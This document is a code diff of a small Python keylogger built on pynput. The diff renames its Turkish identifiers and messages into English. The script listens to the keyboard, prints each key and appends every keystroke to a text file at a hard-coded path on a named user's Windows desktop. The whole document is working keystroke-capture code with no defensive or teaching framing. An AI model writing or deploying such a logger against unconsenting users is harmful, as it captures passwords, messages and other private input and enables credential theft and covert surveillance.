@@ -1,21 +1,20 @@
 from pynput import keyboard
 
-def tusaBasildiginda(tus):
+def keyPressed(key):
     try:
-        print("Basilan tus: {0}".format(tus.char))
-        dosya = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
-        dosya.write(tus.char +"\n")
+        print("Key pressed: {0}".format(key.char))
+        file = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
+        file.write(key.char +"\n")
     except AttributeError:
-        print("Basilan tus: {0}".format(tus))
-        dosya = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
-        dosya.write("\n"+str(tus)+"\n")
-
-def tusBirakildiginda(tus):
-    # print("Birakilan tus: {0}".format(tus.char))
+        print("Key pressed: {0}".format(key))
+        file = open("C:\\Users\\ketop\\OneDrive\\Masaüstü\\basilantuslar.txt", "a", encoding="utf8")
+        file.write("\n"+str(key)+"\n")
+def keyReleased(key):
+    # print("Key released: {0}".format(key.char))
     pass
 
-with keyboard.Listener(on_press=tusaBasildiginda, on_release=tusBirakildiginda) as dinleyici:
-    dinleyici.join()
+with keyboard.Listener(on_press=keyPressed, on_release=keyReleased) as listener:
+    listener.join()
 
-dinleyici = keyboard.Listener(on_press=tusaBasildiginda, on_release=tusBirakildiginda)
-dinleyici.start()
+listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
+listener.start()
